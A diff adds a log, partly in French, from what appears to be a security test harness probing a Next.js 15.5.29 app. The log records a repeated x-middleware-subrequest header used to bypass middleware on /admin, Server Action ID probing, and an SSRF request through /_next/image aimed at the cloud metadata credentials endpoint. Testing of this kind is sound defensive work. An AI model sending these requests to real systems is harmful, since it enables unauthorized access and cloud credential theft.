@@ -1,0 +1,22 @@
+15.5.29  default     id d'action (html)                 40d69b96abdf425dc57fc38a9f9f9c6c5e9c892e6a (42 car.)
+15.5.29  default     id d'action (manifeste)            40d69b96abdf425dc57fc38a9f9f9c6c5e9c892e6a
+15.5.29  default     29927 valeur x5                    307 bloqué
+15.5.29  default     29927 valeur x1                    307
+15.5.29  default     Next-Action x… (1 car.)          404 Server action not found.
+15.5.29  default     Next-Action d73006… (42 car.) faux 404 Server action not found.
+15.5.29  default     Next-Action 40d69b… (42 car.) réel 500 0:{"a":"$@1","f":"","b":"rjRi5TFTbBsrioVZCzN5r"}1:E{"digest":"2015273
+15.5.29  default     SSRF image                         400 "url" parameter is not allowed | IMDS: 0 req.
+15.5.29 default next.log: [Error: The Server Reference ID did not match the expected format. Received "x".
+15.5.29 default next.log: Read more: https://nextjs.org/docs/messages/failed-to-find-server-action]
+15.5.29 default next.log: [Error: Failed to find Server Action "d73006d0efe38f9beb8035a5884a1849f4ad68d725". This request might be from an older or newer deployment.
+15.5.29 default next.log: Read more: https://nextjs.org/docs/messages/failed-to-find-server-action]
+15.5.29 default nginx: {"time":"2026-11-23T15:35:58+00:00","method":"GET","uri":"/form","status":200,"ua":"curl/7.88.1","content_type":"","next_action":"","x_action_id":"","x_middleware_subrequest":"","transfer_encoding":""}
+15.5.29 default nginx: {"time":"2026-11-23T15:35:58+00:00","method":"GET","uri":"/admin","status":307,"ua":"curl/7.88.1","content_type":"","next_action":"","x_action_id":"","x_middleware_subrequest":"middleware:middleware:middleware:middleware:middleware","transfer_encoding":""}
+15.5.29 default nginx: {"time":"2026-11-23T15:35:58+00:00","method":"GET","uri":"/admin","status":307,"ua":"curl/7.88.1","content_type":"","next_action":"","x_action_id":"","x_middleware_subrequest":"middleware","transfer_encoding":""}
+15.5.29 default nginx: {"time":"2026-11-23T15:35:58+00:00","method":"POST","uri":"/form","status":404,"ua":"curl/7.88.1","content_type":"multipart/form-data; boundary=bissa_cve_boundary","next_action":"x","x_action_id":"","x_middleware_subrequest":"","transfer_encoding":""}
+15.5.29 default nginx: {"time":"2026-11-23T15:35:58+00:00","method":"POST","uri":"/form","status":404,"ua":"curl/7.88.1","content_type":"multipart/form-data; boundary=bissa_cve_boundary","next_action":"d73006d0efe38f9beb8035a5884a1849f4ad68d725","x_action_id":"","x_middleware_subrequest":"","transfer_encoding":""}
+15.5.29 default nginx: {"time":"2026-11-23T15:35:58+00:00","method":"POST","uri":"/form","status":500,"ua":"curl/7.88.1","content_type":"multipart/form-data; boundary=bissa_cve_boundary","next_action":"40d69b96abdf425dc57fc38a9f9f9c6c5e9c892e6a","x_action_id":"","x_middleware_subrequest":"","transfer_encoding":""}
+15.5.29 default nginx: {"time":"2026-11-23T15:35:58+00:00","method":"GET","uri":"/_next/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&w=64&q=75","status":400,"ua":"curl/7.88.1","content_type":"","next_action":"","x_action_id":"","x_middleware_subrequest":"","transfer_encoding":""}
+15.5.29  permissive  SSRF image                         400 The requested resource isn't a valid image. | IMDS: 1 req.
+15.5.29 permissive next.log:  ⨯ The requested resource isn't a valid image for http://169.254.169.254/latest/meta-data/iam/security-credentials/ received null
+15.5.29 permissive nginx: {"time":"2026-11-23T15:36:02+00:00","method":"GET","uri":"/_next/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&w=64&q=75","status":400,"ua":"curl/7.88.1","content_type":"","next_action":"","x_action_id":"","x_middleware_subrequest":"","transfer_encoding":""}
